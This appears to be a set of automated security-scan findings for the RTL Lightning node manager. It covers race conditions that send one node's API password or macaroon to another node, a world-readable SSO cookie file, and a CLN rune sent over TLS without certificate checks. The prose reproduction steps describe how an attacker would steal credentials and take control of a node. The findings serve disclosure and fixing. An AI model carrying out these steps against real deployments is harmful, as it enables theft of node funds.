**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257258

---

# Eclair alias lookups reuse module-level options, sending one node's API password to another node

## Details
Every Eclair controller module keeps a single mutable `let options = null` at module scope. Each request handler starts with `options = common.getOptions(req)`, which is that request's session copy of the selected node's request options, including `headers.authorization = 'Basic ' + base64(':' + lnApiPassword)` (common.ts line 280). Four code paths then use the module variable *after* an awaited upstream call instead of the request's own object:

- `peers.ts getFilteredNodes` (from getPeers line 33 and connectPeer line 82, in the `.then` of POST /peers),
- `peers.ts connectPeer` lines 74-76, the post-connect /peers refresh in the `.then` of POST /connect,
- `channels.ts simplifyAllChannels` (from getChannels line 72, in the `.then` of POST /channels),
- `payments.ts getQueryNodes` (from queryPaymentRoute line 78, in the `.then` of POST /findroutetonode).

Each sets `options.url = selNode.settings.lnServerUrl + '/nodes'` (or '/peers') with the *correct* node URL from its own argument, but posts with whatever object `options` references at that moment — the object assigned by the most recent handler to run in that module. request.ts buildConfig snapshots url/headers/form synchronously at post time, so the first, in-flight call is unaffected; the swap lands on the follow-up call.

Sequence (multi-node RTL, Eclair nodes X and Y with different lnApiPasswords, e.g. an operator session on Y and one on X — two devices, or one session that switched node while a request was pending): (1) a getPeers/getChannels/queryPaymentRoute/connectPeer request for Y runs `options = Y_opts` and awaits Y's reply; (2) any handler in the same module for X runs `options = X_opts`; (3) Y's reply arrives, the `.then` runs `X_opts.url = Y.lnServerUrl + '/nodes'` and posts X_opts — Y's HTTP server receives `Authorization: Basic <X's password>`. The node whose reply arrives second receives the other node's password, and the responding node controls that ordering: request.ts bounds each upstream call at 600000 ms, so a node that holds its /peers, /channels or /findroutetonode response keeps its handler suspended for up to 10 minutes, during which the frontend's fetches for the other node (ecl.effects.ts lines 787-790 dispatch fetchChannels and fetchPeers on every node switch; a hung page is exactly what prompts an operator to switch) reassign `options`. The helpers' `.catch(() => [])` / `.catch(() => simplifiedChannels)` swallow the resulting 401, so the leak is silent.

Assumption: express-session 1.18.2 with its default MemoryStore (app.ts line 55, no `store`) JSON-parses the stored session on every request, so concurrent requests — even two of one session across a node switch — hold distinct option objects with different headers; two different sessions always do.

Result: one node's full-control API password (threat model: 'Exposure = full control of funds'; SECURITY.md in-scope: 'exposure of node credentials ... API passwords') is transmitted to a different node's HTTP server over a link RTL sends with `rejectUnauthorized: false` (request.ts line 12) and often plain HTTP. The receiving node, its host, or anyone on-path to it obtains a credential for a node it was never meant to see. The maintainers fixed exactly this class for LND (#1651, #1668) and for Eclair's `getSentPaymentsInformation` (payments.ts 108-116; regression test 'keeps its own credentials when another session makes a request'), and Release-notes-0.15.11.md states 'CLN and Eclair are structurally unaffected' — but the three alias-lookup helpers and connectPeer's follow-up read the shared variable after the same kind of async boundary. Single-node deployments and multi-node deployments where every Eclair node shares one password (LN_API_PASSWORD env applies to all nodes) are unaffected.

## Evidence
1. [server/controllers/eclair/peers.ts:9–16](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/peers.ts#L9-L16)
   getFilteredNodes writes url/form into the module-level `options` (declared line 5) and posts it. It is only ever called from getPeers (line 33) and connectPeer (line 82) inside the `.then` of an awaited POST /peers, by which time any other handler in this module (getPeers, connectPeer, deletePeer) for a different node may have reassigned `options` to that request's session object. The URL comes from the selNode argument (correct node); the authorization header comes from whatever object `options` currently references. `.catch((err) => [])` swallows the resulting 401 so the swap is silent.
2. [server/controllers/eclair/peers.ts:20–33](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/peers.ts#L20-L33)
   getPeers assigns the module variable `options = common.getOptions(req)` (this request's session object, headers.authorization = Basic lnApiPassword of its selected node), awaits POST /peers, then calls getFilteredNodes(req.session.selectedNode, ...) which reads the shared variable instead of this request's object.
3. [server/controllers/eclair/channels.ts:36–40](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/channels.ts#L36-L40)
   simplifyAllChannels: `options.url = selNode.settings.lnServerUrl + '/nodes'; options.form = channelNodeIds; request.post(options)` on the module-level `options` (line 9), reached only from getChannels (line 72) inside the `.then` of the awaited POST /channels. Same race: this node's URL with whichever node's credentials `options` holds by then; `.catch((err) => simplifiedChannels)` hides the failure.
4. [server/controllers/eclair/peers.ts:74–76](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/peers.ts#L74-L76)
   connectPeer's follow-up `options.url = req.session.selectedNode.settings.lnServerUrl + '/peers'; options.form = {}; request.post(options)` runs inside the `.then` of the awaited POST /connect on the module variable, so this node's /peers URL is posted with whichever session's authorization header `options` holds by then; its result then feeds getFilteredNodes (line 82) a second time.
5. [server/controllers/eclair/payments.ts:22–29](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/payments.ts#L22-L29)
   getQueryNodes does the same with the module-level `options` (line 5); reached from queryPaymentRoute (line 78) inside the `.then` of the awaited POST /findroutetonode. Lines 108-116 of the same file show getSentPaymentsInformation already fixed for this class (per-request `{ ...options }` copy passed as an argument); the sibling helper was left on the shared variable.
6. [server/utils/common.ts:244–253](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L244-L253)
   getOptions returns `req.session.selectedNode.authentication.options` — the live object inside this request's session copy. Line 280 (updateSelectedNodeOptions, ECL case) builds its `headers.authorization = 'Basic ' + base64(':' + lnApiPassword)` from that node's own password only. Two concurrent requests whose sessions select different Eclair nodes therefore hand the controllers two distinct objects carrying two different passwords (assumption: express-session 1.18.2's default MemoryStore, app.ts line 55 with no `store`, JSON-parses the stored session on every request, so even two overlapping requests of one session that switched node hold distinct copies).
7. [server/utils/request.ts:12–24](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/request.ts#L12-L24)
   buildConfig snapshots url/headers/form synchronously at post time (so the in-flight first call is unaffected and the leak is confined to the follow-up /nodes or /peers call), connects with `rejectUnauthorized: false` (an on-path party on the RTL -> node link can read the Basic header), and bounds each upstream call at 600000 ms (line 24): a node that delays its /peers, /channels or /findroutetonode reply holds its RTL handler suspended for up to 10 minutes, so the window in which another node's request can reassign `options` is set by the responding node, not by chance.
8. [test/backend/eclair-sent-payments.test.mjs:73–86](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/test/backend/eclair-sent-payments.test.mjs#L73-L86)
   Maintainers' regression test 'a list still being fetched keeps its own credentials when another session makes a request' states the property the project guarantees for getsentinfos: every call to a node carries only that node's authorization header. The three alias-lookup helpers and connectPeer's follow-up violate the same property.
9. [release-notes/Release-notes-0.15.11.md:8–19](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/release-notes/Release-notes-0.15.11.md#L8-L19)
   The project's own description of this defect class for LND (#1668: 'a request for a different node arriving in that window (a second tab, or a multi-node switch) made node A's alias lookups ... go out with node B's URL or macaroon') and its claim that 'CLN and Eclair are structurally unaffected'. The Eclair helpers above are reached after an awaited round trip, the same async boundary, so the claim does not hold.

## Impact
RTL discloses a node credential it holds in trust (lnApiPassword, as a Basic header) to a server other than the one it was issued for. No integrity or availability effect on RTL itself. Subsequent-system impact: The leaked value is the complete Eclair API password of the other node; whoever receives it can call every Eclair method (sendonchain, forceclose, payinvoice, channel settings) against that node directly — full control of its funds and configuration.

## Reproduction steps
1. Attacker is a second Eclair node's HTTP server (compromised or differently administered), or an on-path party on RTL's unverified link to it (request.ts: rejectUnauthorized false, plain http allowed). No RTL privilege needed (PR:N). Attack requirements present: RTL configured with two or more Eclair nodes with different passwords, and a request for the other node arriving while the attacker node's reply is outstanding — a race whose window the attacker node widens by delaying its own reply (up to the 600 s axios bound), rather than one it must win by luck; the on-path variant needs network position. The operator only performs routine use (switching nodes in the UI, or using two devices), so UI is passive.

## Recommended fix
1. getFilteredNodes, simplifyAllChannels and getQueryNodes read the module-level `options` after an await, so the credential header used for the follow-up /nodes call can belong to a different session's node than the URL it is sent to. Fix criteria: Each follow-up call must use the originating request's own options (a per-request copy passed as an argument, as getSentPaymentsInformation already does), never module-level mutable state. Verify with a test like eclair-sent-payments.test.mjs line 73 for getPeers/connectPeer, getChannels and queryPaymentRoute: with two sessions holding different passwords and overlapping requests, every call to node X's URL must carry only X's authorization header.
2. Module-level `let options` shared across concurrent requests in all Eclair controllers is the enabling pattern; the same mistake can recur in any handler that touches `options` after an await. Fix criteria: Remove module-scoped mutable request options from the Eclair controllers (and the getOptions pattern that hands out the live session object) so that no code path can observe another request's options; verify no `options.` access in these modules occurs outside the synchronous prologue of the handler that assigned it.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-362](https://cwe.mitre.org/data/definitions/362.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257257

---

# SSO one-time cookie file created with default (umask) permissions, readable by other local users

## Details
When SSO is enabled (rtlSSO=1 / RTL_SSO=1 — the documented mode for hosted integrations such as BTCPay Server), RTL authenticates a caller solely by comparing the supplied access-key with the SHA-256 of the contents of the cookie file at SSO.rtlCookiePath (authenticate.ts matchesSSOCookie, lines 141-147), and a match mints the single operator-role JWT (lines 161-166). The threat model lists this file's contents as a protected asset. common.ts readCookie creates the file on first boot with fs.writeFileSync(rtlCookiePath, crypto.randomBytes(64).toString('hex')) and no mode argument (line 567); refreshCookie (line 578) rewrites it the same way on every successful login, which preserves the inode's mode; and createDirectory (line 592) makes missing parents with mkdirSync and no mode. Nothing in server/ ever chmods the path. Assumption (Node >=20.19 per package.json engines; node:22-alpine in the Dockerfile): fs.writeFileSync's documented default mode is 0o666 and mkdirSync's is 0o777, each masked by the process umask — 0644/0755 under the common 022 umask — so the bearer secret is readable by every local account for the lifetime of the deployment while its value rotates.

Any unprivileged local account on the host where RTL runs with SSO enabled — or any process sharing the cookie's directory other than the intended SSO provider — can read the file at any time, compute sha256 of its contents, and POST {authenticateWith:'PASSWORD', authenticationValue:<hex digest>} to /rtl/api/authenticate on RTL's port. RTL answers with a session JWT that is the operator role: send Lightning and on-chain payments, open/close channels, change RTL and node settings, read the masked config, download channel backups. The attacker thereby escalates from an unprivileged local account to control of the Lightning node's funds without needing the node's own credential files (assumption: lnd and CLN create admin.macaroon and the rune file owner-only). Password login and 2FA are not consulted in SSO mode, so the cookie is the only gate.

Condition under which this holds: SSO must be enabled and the cookie file's directory must be reachable by accounts other than RTL's own and the SSO provider's. The shipped Docker image runs as root with no USER directive and Docker-managed volumes are root-owned on the host, so the Docker/BTCPay deployment is exposed only where the cookie directory is bind-mounted or shared more widely; standalone (node rtl / systemd) deployments on a multi-user host are exposed wherever rtlCookiePath points into a traversable directory. The recorded threat model does not enumerate a local-account adversary, but SECURITY.md places in scope 'anything that lets an unauthenticated or lower-privileged party do what only the authenticated node operator should', naming the SSO one-time-cookie flow, and the project's own config-save path (RTLConf.ts:467-471) already treats on-disk secrets as requiring 0600. The documentation (Application_configurations.md) gives no permission or umask guidance for the cookie file, so there is no documented fencing requirement an operator could have applied. Note that the SSO design intends the cookie to be read by the SSO provider (BTCPay), so the fix must keep it readable by that principal (owner, or a shared group) while removing world access. RTL-Config.json created by config.ts:388 is likewise written with default mode; that is a sibling defect outside this finding.

## Evidence
1. [server/utils/common.ts:566–567](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L566-L567)
   readCookie's first-boot branch creates the SSO cookie file with fs.writeFileSync(rtlCookiePath, randomBytes(64).hex) and no mode option (line 567), so the file is created 0666 & ~umask — 0644 under the usual 022 umask, i.e. readable by every local account; createDirectory (line 566) makes any missing parent directories without a mode either. The compiled backend/utils/common.js:569-571 matches.
2. [server/utils/common.ts:576–583](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L576-L583)
   refreshCookie (called on every successful SSO login) rewrites the value with fs.writeFileSync on the existing path and no mode; a rewrite of an existing inode keeps its mode, so the permissive mode set at creation persists for the life of the deployment while only the contents rotate. No chmod/chmodSync is applied anywhere in server/ to this path (the only chmod in the tree is RTLConf.ts:470 for the config file).
3. [server/controllers/shared/authenticate.ts:141–146](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L141-L146)
   matchesSSOCookie: with rtlSSO=1 the only secret checked is the file's contents — the caller passes hex sha256(cookieValue) as authenticationValue and it is compared with timingSafeEqual. Anyone who can read the file can produce the matching key.
4. [server/controllers/shared/authenticate.ts:161–165](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L161-L165)
   The SSO branch of authenticateUser mints the single operator-role session JWT ({user:'SSO_USER'}) for a matching key; there is no second factor or other check in SSO mode, so the file read alone yields full operator access.
5. [server/utils/common.ts:592](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L592)
   createDirectory uses fs.mkdirSync(curDir) with default mode (0777 & ~umask = 0755), so a directory RTL itself creates for the cookie does not shield the file.
6. [server/controllers/shared/RTLConf.ts:467–470](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L467-L470)
   Contrast: the settings-save path deliberately creates its temp config file with mode 0o600 'so the secrets it carries ... are never world-readable', showing the project treats on-disk secrets as needing restrictive modes; the SSO cookie — a live bearer credential — receives no such treatment.

## Impact
The minted JWT is RTL's single operator role: full read of everything RTL exposes including the masked config and channel backups (C:HIGH), every state-changing operator action including settings writes to RTL-Config.json (I:HIGH), and the ability to lock the real operator out or disrupt the service by changing settings (A:HIGH). Subsequent-system impact: Through the operator session the attacker directs the Lightning node — a separate process authenticated with RTL's stored macaroon/rune/API password — to send on-chain and Lightning payments, close channels and change node settings: loss of funds and node disruption on a system beyond RTL's own boundary.

## Reproduction steps
1. The attacker is an unprivileged local account on the host or container where RTL runs with SSO enabled, or a process sharing the cookie's directory that is not the SSO provider (AV:LOCAL, PR:LOW). Under the default 022 umask the file is 0644 and the directory 0755, so reading the file, hashing it with sha256 and POSTing the digest to /rtl/api/authenticate is deterministic and repeatable (AC:LOW), with no operator interaction (UI:NONE). Exploitation depends on SSO being the configured auth mode and on the cookie's directory being reachable by other local accounts (the shipped Docker image's root-owned volumes are not, standalone multi-user hosts are), so AT is PRESENT. Assumes Node's documented fs.writeFileSync default mode of 0o666 (Node >=20.19 / node:22-alpine).

## Recommended fix
readCookie and refreshCookie write the SSO bearer secret to disk with fs.writeFileSync and no mode, and createDirectory makes its parent with mkdirSync and no mode, so the file and directory inherit the process umask and are readable by other local accounts; nothing later tightens them. Fix criteria: The cookie file must be created and rewritten with no group/other access regardless of umask (owner-only, or owner plus a group that the SSO provider belongs to where the deployment needs it), an existing file with a wider mode must be tightened or refused at boot, and a directory RTL creates for it must not be world-traversable. After the fix, stat on rtlCookiePath shows no 'other' permission bits after first boot and after each SSO login, and a non-owner local account cannot read it.

---
**Severity:** HIGH
**Status:** Open
**Category:** Incorrect default permissions
**CWE:** [CWE-276](https://cwe.mitre.org/data/definitions/276.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257256

---

# LND channel list alias lookups read module-level options after await, leaking another node's macaroon

## Details
The three LND channel list handlers in server/controllers/lnd/channels.ts (getAllChannels, getPendingChannels, getClosedChannels) issue one /v1/graph/node/<pubkey> alias lookup per channel after the initial /v1/channels round trip has resolved. The request options for those lookups are taken from the file-wide binding `let options` *inside* the `.then` callback (`const { qs: _qs, ...requestOptions } = options;` at lines 41, 74 and 115), i.e. after an async boundary. Every handler in the file reassigns that binding on entry to `req.session.selectedNode.authentication.options`, the per-request session object that carries the selected node's hex admin macaroon in `headers['Grpc-Metadata-macaroon']` and that node's lnServerUrl.

In a multi-node RTL deployment, if any channels.ts handler for node B runs while node A's /v1/channels call is still outstanding (the operator switches node in the UI, has two sessions on different nodes, or a script polls both), node A's `.then` snapshots node B's options. getAliasForChannel (lines 9-20) then overwrites only `url` with node A's lnServerUrl and sends the request with node B's macaroon. Node A's REST endpoint (and, since every LND request is sent with rejectUnauthorized:false, anyone in a machine-in-the-middle position on the RTL->A link) receives node B's admin macaroon in a request header. The lookup fails with 'invalid macaroon', the `.catch` silently falls back to a pubkey prefix as alias, and nothing is reported.

The window is not merely a timing accident: request.ts applies a 600 s timeout, so a malicious or compromised node A can simply hold its /v1/channels (or /pending or /closed) response open until the operator moves to another node, which the UI does by firing the same channel list calls for node B. The frontend requests channels, pending and closed in parallel on every channel page load, so the race is also hit by ordinary latency differences between nodes.

This is the same defect class the maintainers fixed in peers.ts and payments.ts (#1651/#1662, see test/backend/lnd-peers.test.mjs: 'every request a handler issues after an async boundary must use the options snapshotted on entry, never the module binding'). peers.ts takes the snapshot before `request(...)`; channels.ts takes it inside `.then` and therefore still has the bug. The threat model names the Lightning node RTL talks to (or a MITM on that unverified-TLS link) as an adversary and the LND admin macaroon as the asset whose exposure equals full control of funds. In a deployment where the nodes are in different trust domains (e.g. one self-hosted, one at a hosting provider), the provider or a MITM on that node's link obtains the admin macaroon of the operator's other node.

## Evidence
1. [server/controllers/lnd/channels.ts:40–42](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/channels.ts#L40-L42)
   Inside the .then of the /v1/channels round trip, getAllChannels destructures the module-level `options` binding (`const { qs: _qs, ...requestOptions } = options;`) and hands copies of it to one getAliasForChannel call per channel. By this point another channels.ts handler may have reassigned `options` to a different session's selectedNode.authentication.options, so requestOptions.headers carries that other node's Grpc-Metadata-macaroon while selNode (captured from req.session on line 40) is still node A. This is the primary fix site: the snapshot must be taken synchronously before request(options) on line 31, as peers.ts does.
2. [server/controllers/lnd/channels.ts:9–20](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/channels.ts#L9-L20)
   getAliasForChannel overwrites only requestOptions.url with selNode.settings.lnServerUrl + '/v1/graph/node/' + pubkey (node A's URL) and sends with whatever headers the snapshot carried. With a stale snapshot this is an HTTP request to node A authenticated with node B's admin macaroon; the 401 is swallowed by the .catch and the alias falls back to a pubkey prefix, so nothing is reported to the operator.
3. [server/controllers/lnd/channels.ts:73–74](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/channels.ts#L73-L74)
   getPendingChannels takes the identical post-await snapshot of the module-level `options` inside its .then for the pending-channel alias lookups.
4. [server/controllers/lnd/channels.ts:114–116](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/channels.ts#L114-L116)
   getClosedChannels takes the identical post-await snapshot of the module-level `options` inside its .then for the closed-channel alias lookups.
5. [server/controllers/lnd/channels.ts:5](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/channels.ts#L5)
   `let options = null;` is one module-wide mutable binding shared by every handler in this file; each handler reassigns it on entry via `options = common.getOptions(req)` (lines 24, 65, 105, 161, 215, 251), so any channels.ts request for another node that starts during node A's /v1/channels round trip replaces the object the .then will read.
6. [server/utils/common.ts:244–253](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L244-L253)
   getOptions returns req.session.selectedNode.authentication.options itself; its headers['Grpc-Metadata-macaroon'] is the selected node's hex admin.macaroon, loaded per node at boot by setOptions (lines ~343-345) and refreshed by updateSelectedNodeOptions. express-session 1.18.2 MemoryStore deserialises a fresh session object per request, so the module-level binding is the only path by which one request's .then can see another request's node credentials.
7. [server/utils/request.ts:24](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/request.ts#L24)
   Every upstream call gets a 600 s timeout, so a malicious or compromised node A can hold its /v1/channels (or /pending, /closed) response open for up to ten minutes, which is the window in which the operator's next node switch reassigns the module binding. The race is attacker-widened, not a timing accident.
8. [server/utils/request.ts:12](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/request.ts#L12)
   All LND requests use an https.Agent with rejectUnauthorized:false (applied on line 28 because every node's options carry rejectUnauthorized:false), so a machine-in-the-middle on the RTL->node A link is also in position to receive node B's macaroon from the mis-authenticated alias lookups.
9. [server/controllers/shared/RTLConf.ts:227–230](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L227-L230)
   GET /rtl/api/conf/updateSelNode/:curr/:prev replaces req.session.selectedNode with common.findNode(curr), whose authentication.options already hold node B's macaroon; every subsequent handler in that session therefore reassigns the channels.ts module binding to node B's credentials.
10. [src/app/lnd/store/lnd.effects.ts:1266–1268](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/store/lnd.effects.ts#L1266-L1268)
   After a node switch the frontend's initializeRemainingData dispatches fetchChannels, fetchPendingChannels and fetchClosedChannels for the new node in parallel, so the routine UI switch is exactly the action that runs the three channels.ts list handlers for node B while node A's stalled list request is still outstanding.
11. [server/controllers/lnd/peers.ts:23–30](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/peers.ts#L23-L30)
   The sibling peers controller, fixed for this exact defect (#1668 fixing #1662, release-notes 0.15.11; pinned by test/backend/lnd-peers.test.mjs), snapshots requestOptions synchronously before request(...) is issued. channels.ts snapshots inside .then, so the invariant 'every request a handler issues after an async boundary must use the options snapshotted on entry, never the module binding' does not hold there; test/backend/lnd-channels.test.mjs covers only postChannel.

## Impact
RTL discloses the most sensitive secret it holds for node B - the hex admin.macaroon - to a party that is not node B (node A's host or a MITM on that link). Confidentiality HIGH. RTL's own integrity and availability are unaffected: the mis-authenticated lookups fail with 401, the .catch substitutes pubkey prefixes, and the response is still served. Subsequent-system impact: An LND admin macaroon is bearer authentication for node B's full gRPC/REST API. Assuming the recipient can reach node B's REST/gRPC endpoint (not established by this code; depends on the deployment's network layout), it can read all node data, send payments, open/close channels, sweep on-chain funds and disrupt the node - the threat model's 'exposure = full control of funds' asset. Impact crosses from RTL into node B's security domain.

## Reproduction steps
1. Attacker position: the host of one configured LND node (node A) or a MITM on RTL's unverified-TLS link to it; no RTL credentials needed (PR:N, AV:N). The attacker stalls node A's /v1/channels, /pending or /closed response (request.ts allows 600 s). The operator, using the UI normally, switches to another configured node B; the UI fires the three channel-list handlers for B, each reassigning the channels.ts module binding to B's session options. When A's stalled response is released, A's .then snapshots B's options and the alias lookups go to A carrying B's admin macaroon (UI:P - routine operator action). Requires a multi-node RTL config whose nodes sit in different trust domains plus the race window, which the attacker controls by stalling (AT:P). No defence evasion beyond that (AC:L).

## Recommended fix
1. The channels.ts list handlers (getAllChannels, getPendingChannels, getClosedChannels) read the shared module-level `options` binding after an async boundary (inside .then), so the credentials used for the follow-up /v1/graph/node alias lookups can belong to a different request, session and node than the one being served; per-node credential isolation across concurrent requests is violated. Fix criteria: Every upstream request a channels.ts handler issues after its first await is built from options captured synchronously on handler entry (or from req.session.selectedNode directly), never from the module-level binding; preferably the module-level `options` binding is removed from the file. Verification mirrors test/backend/lnd-peers.test.mjs: start fake LND nodes A and B that each reject foreign macaroons, hold A's /v1/channels (and /pending, /closed) response, run a channels.ts handler for B, release A, and assert every /v1/graph/node request to A carries A's macaroon and none carries B's.
2. The fix for this defect class (#1651, #1662) was applied to peers.ts and the limiter-deferred tasks but not audited across every handler that performs follow-up requests after an await; the regression test for channels.ts covers only postChannel. Fix criteria: A lint rule or code-review checklist item rejects reads of a module-level request-options binding inside promise callbacks in server/controllers/**, and each LND controller with post-await follow-up requests has a cross-node regression test of the lnd-peers.test.mjs shape.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-362](https://cwe.mitre.org/data/definitions/362.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257254

---

# CLN rune sent over TLS with certificate verification disabled in socket.io client

## Details
RTL authenticates to Core Lightning's clnrest with a rune: a bearer credential that, as configured for RTL (admin-level rune per the setup docs), grants full control of the node including payments and channel operations. server/controllers/cln/webSocketClient.ts connectWithClient (lines 60-68) reads the rune (common.getRuneValue(runePath), cached as runeValue) and opens the socket.io connection to selectedNode.settings.lnServerUrl with

  extraHeaders: { rune: ... }, transports: ['websocket'], secure: true, rejectUnauthorized: false

`rejectUnauthorized: false` is passed to socket.io-client 4.8.3 (engine.io-client 6.6.6, ws 8.21.0 per package-lock.json). Assumption about the pinned dependencies: engine.io-client's Node WebSocket transport forwards the documented Node TLS options (including rejectUnauthorized) to ws, which passes them to tls.connect, so the handshake completes with any certificate. The server certificate is therefore never validated against anything -- not a CA, not a pinned clnrest certificate, not even hostname -- so any host that can place itself between RTL and the clnrest endpoint (or that answers for the endpoint's address, e.g. by ARP/DNS spoofing on the LAN or by holding the Docker/VPN hop) can present an arbitrary certificate, complete the handshake, and read the rune from the upgrade request headers. The project's own docs sanction this deployment: Core_lightning_setup.md tells operators to set lnServerUrl to `https://<CLNRest api server ip address>:3001`, Multi_node_setup.md (line 28) gives `https://192.168.0.1:3001` for a node on another host, and RTL_setups.md (line 54) covers RTL and the node running on different devices including an external network or cloud service. No config field (server/models/config.model.ts Settings/Authentication) lets an operator supply or pin the node's certificate, so even an operator who wants verification cannot enable it. SECURITY.md's out-of-scope 'Plain HTTP' item concerns how RTL serves its own UI, not the credentialed link RTL initiates to the node; the threat model lists that link as trust boundary (c) and a MITM on it as adversary 4.

The client is opened in normal operation: server/utils/webSocketServer.ts emits eventEmitterCLN 'CONNECT' (line 150) whenever the operator's browser WebSocket session selects a CLN node, and the credential is re-sent on every reconnect (reconnect, lines 25-35, with 0.5-64 s backoff), so the window is permanent rather than a single boot.

The same rejectUnauthorized:false choice is made for the REST path through server/utils/request.ts and common.ts (a separate sink, tracked by its own finding at request.ts:12); this finding is filed on the socket.io sink, which does not pass through request.ts.

An attacker holding the rune can call clnrest directly (pay, withdraw, close channels) without touching RTL again; they can also stay in the middle and feed RTL fabricated notifications (invoice paid, channel state) that sendEventsToAllLNClients forwards to the browser as node state.

## Evidence
1. [server/controllers/cln/webSocketClient.ts:60–68](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/cln/webSocketClient.ts#L60-L68)
   connectWithClient reads the rune (common.getRuneValue(runePath), cached as authentication.runeValue) and opens the socket.io connection to selectedNode.settings.lnServerUrl with extraHeaders: { rune }, secure: true and rejectUnauthorized: false. The server certificate is never validated (no CA, no pinned clnrest certificate, no hostname check), so whoever terminates TLS at the configured address receives the rune in the upgrade request headers. This is the code the fix must change.
2. [server/controllers/cln/webSocketClient.ts:25–35](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/cln/webSocketClient.ts#L25-L35)
